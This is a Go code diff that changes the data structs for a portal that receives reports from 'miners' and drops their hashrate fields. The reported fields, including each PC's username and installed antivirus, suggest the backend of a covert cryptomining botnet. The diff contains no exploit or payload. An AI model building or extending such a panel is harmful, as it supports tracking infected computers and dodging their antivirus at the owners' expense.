@@ -2,16 +2,14 @@ package models
 
 // MinerReport represents the data sent by miners to the portal
 type MinerReport struct {
-	PCUsername      string  `json:"pc_username"`
-	DeviceHash      string  `json:"device_hash"` // Unique device identifier
-	CPUName         string  `json:"cpu_name"`
-	GPUName         string  `json:"gpu_name"`
-	CPUHashrate     float64 `json:"cpu_hashrate"` // in H/s
-	GPUHashrate     float64 `json:"gpu_hashrate"` // in H/s
-	AntivirusName   string  `json:"antivirus_name"`
-	DeviceUptimeMin int     `json:"device_uptime_min"` // in minutes
-	ClientVersion   string  `json:"client_version"`    // Client version string
-	Timestamp       int64   `json:"timestamp"`
+	PCUsername      string `json:"pc_username"`
+	DeviceHash      string `json:"device_hash"` // Unique device identifier
+	CPUName         string `json:"cpu_name"`
+	GPUName         string `json:"gpu_name"`
+	AntivirusName   string `json:"antivirus_name"`
+	DeviceUptimeMin int    `json:"device_uptime_min"` // in minutes
+	ClientVersion   string `json:"client_version"`    // Client version string
+	Timestamp       int64  `json:"timestamp"`
 }
 
 // MinerConfig represents configuration sent to miners (for each CPU/GPU)
@@ -30,19 +28,17 @@ type MinerConfig struct {
 
 // Miner represents a mining device
 type Miner struct {
-	ID              int     `json:"id"`
-	DeviceHash      string  `json:"device_hash"`
-	PCUsername      string  `json:"pc_username"`
-	CPUName         string  `json:"cpu_name"`
-	GPUName         string  `json:"gpu_name"`
-	CPUHashRate     float64 `json:"cpu_hashrate"`
-	GPUHashRate     float64 `json:"gpu_hashrate"`
-	AntivirusName   string  `json:"antivirus_name"`
-	DeviceUptimeMin int     `json:"device_uptime_min"`
-	ClientVersion   string  `json:"client_version"`
-	Status          string  `json:"status"`
-	LastSeen        int64   `json:"last_seen"`
-	CreatedAt       int64   `json:"created_at"`
+	ID              int    `json:"id"`
+	DeviceHash      string `json:"device_hash"`
+	PCUsername      string `json:"pc_username"`
+	CPUName         string `json:"cpu_name"`
+	GPUName         string `json:"gpu_name"`
+	AntivirusName   string `json:"antivirus_name"`
+	DeviceUptimeMin int    `json:"device_uptime_min"`
+	ClientVersion   string `json:"client_version"`
+	Status          string `json:"status"`
+	LastSeen        int64  `json:"last_seen"`
+	CreatedAt       int64  `json:"created_at"`
 }
 
 // Config represents application configuration
